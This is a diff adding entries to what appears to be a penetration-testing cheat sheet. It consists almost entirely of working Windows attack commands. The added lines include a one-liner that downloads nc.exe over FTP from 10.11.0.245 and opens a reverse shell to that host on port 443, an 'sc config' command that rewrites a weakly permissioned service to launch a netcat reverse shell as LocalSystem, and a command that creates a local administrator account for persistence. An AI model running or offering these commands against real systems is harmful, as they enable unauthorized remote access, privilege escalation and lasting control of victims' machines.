@@ -223,6 +223,10 @@ echo get file.exe>>ftp-commands.txt
 echo bye>>ftp-commands.txt 
 ftp -s:ftp-commands.txt
 ```
+```bash
+# Or just a one-liner
+(echo open 10.11.0.245&echo anonymous&echo whatever&echo binary&echo get nc.exe&echo bye) > ftp.txt & ftp -s:ftp.txt & nc.exe 10.11.0.245 443 -e cmd
+```
 
 ##### HTTP: Powershell
 ```PowerShell
@@ -304,10 +308,14 @@ nc -nvv -w 1 -z host 1000-2000
 nc -nv -u -z -w 1 host 160-162
 ```
 
-#### Finding Vulnerable Windows Services
+#### Exploiting Vulnerable Windows Services: Weak Service Permissions
 ```
 # Look for SERVICE_ALL_ACCESS in the output
-accesschk.exe -uwcqv "user-you-have-shell-with" *
+accesschk.exe -uwcqv "Authenticated Users" *
+
+sc config [service_name] binpath= "C:\nc.exe 10.11.0.245 443 -e C:\WINDOWS\System32\cmd.exe" obj= "LocalSystem" password= ""
+sc qc [service_name] (to verify!)
+sc start [service_name]
 ```
 
 
@@ -373,6 +381,12 @@ find /etc -iname *.conf
 ```
 
 ## Maintaining Access
+
+#### Creating User and Adding to Local Administrators
+```bash
+net user spotless spotless /add & net localgroup Administrators spotless /add 
+```
+
 #### Persistent Back Doors
 ```
 # Launch evil.exe every 10 minutes
